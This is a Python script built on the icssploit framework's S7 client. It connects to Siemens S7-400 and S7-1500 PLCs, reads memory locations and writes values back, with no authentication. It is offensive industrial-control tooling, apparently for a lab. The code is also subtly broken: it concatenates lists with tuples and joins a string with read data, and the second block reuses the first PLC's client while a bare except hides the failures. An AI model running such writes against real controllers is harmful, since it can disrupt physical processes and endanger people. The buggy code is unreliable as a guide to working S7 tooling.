
import os
import sys
sys.path.append('./scripts/isf')
from icssploit.clients.s7_client import S7Client

ip_400 = os.environ["s7_400"]
target = S7Client(name="S7-400", ip=ip_400, rack=0, slot=3)
try:
    print('\033[46;1mS7-400 PLC - ' + ip_400 + ':\033[0m')
    target.connect()
    location = [os.environ["s7readlocation"].split(",") + (2,)]
    print(location)
    data = target.read_var(location)[0]
    print('\033[36;1mFound PLC variables: ' + data + '\033[0m')
    writeLocation = [os.environ["s7readlocation"].split(",") + ([data[0], data[1]])]
    print(writeLocation)
    target.write_var(writeLocation)
except:
    print('\033[41;1mSomething went wrong while connecting to ' + ip_400 + '\033[0m')

ip_1500 = os.environ["s7_1500"]
target2 = S7Client(name="S7-1500", ip=ip_1500, rack=0, slot=3)
try:
    print('\033[46;1mS7-1500 PLC - ' + ip_1500 + ':\033[0m')
    target2.connect()
    location = [os.environ["s7readlocation"].split(",") + (2,)]
    print(location)
    data = target.read_var(location)[0]
    print('\033[36;1mFound PLC variables: ' + data + '\033[0m')
    writeLocation = [os.environ["s7readlocation"].split(",") + ([data[0], data[1]])]
    print(writeLocation)
    target.write_var(writeLocation)
except:
    print('\033[41;1mSomething went wrong while connecting to ' + ip_1500 + '\033[0m')

